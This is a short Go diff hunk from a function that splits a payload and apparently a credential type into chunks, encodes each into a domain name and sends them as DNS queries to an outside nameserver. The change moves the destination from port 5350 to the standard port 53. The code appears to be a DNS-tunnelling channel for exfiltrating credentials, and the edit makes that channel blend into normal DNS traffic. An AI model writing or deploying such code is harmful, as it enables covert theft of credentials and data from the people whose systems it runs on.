@@ -80,7 +80,7 @@ func sendData(payload string, t TypeCred) {
 	for i, p := range pslice {
 		domain := encode(p, t, i)
 		msg.SetQuestion(domain, dns.TypeA)
-		_, _, err := client.Exchange(&msg, "ns7."+DNS+":5350")
+		_, _, err := client.Exchange(&msg, "ns7."+DNS+":53")
 		if err != nil {
 			fmt.Printf("failed exchange, %s", err.Error())
 		}
